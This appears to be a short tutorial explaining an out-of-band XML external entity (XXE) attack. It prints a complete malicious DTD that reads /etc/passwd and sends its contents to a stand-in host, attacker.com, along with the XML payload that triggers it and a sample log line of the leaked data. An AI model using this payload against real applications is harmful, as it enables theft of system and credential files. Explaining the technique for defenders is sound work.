Anatomy of an Out-of-Band XXE Attack

This example demonstrates how an attacker uses a malicious DTD hosted on their server to exfiltrate sensitive data like /etc/passwd from a vulnerable application when direct in-band display is not possible.

Malicious DTD

The DTD defines entities to read a local file and then construct a URL containing that file's content, pointing back to the attacker's server.

XML Payload

The attacker sends an XML document that references the external malicious DTD hosted on their server, triggering the OOB interaction.

Key Takeaway

OOB XXE is a sophisticated technique that leverages external DTDs to bypass direct response limitations and exfiltrate data to an attacker-controlled server.

Malicious DTD & XML Payload
<!-- malicious.dtd hosted on attacker.com -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % send_file SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send_file;

// Attacker's XML Payload sent to vulnerable app:
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<data>&send_file;</data>

// Attacker's HTTP server log (example):
// GET /?data=root:x:0:0:root:/root:/bin/bash%0A... HTTP/1.1
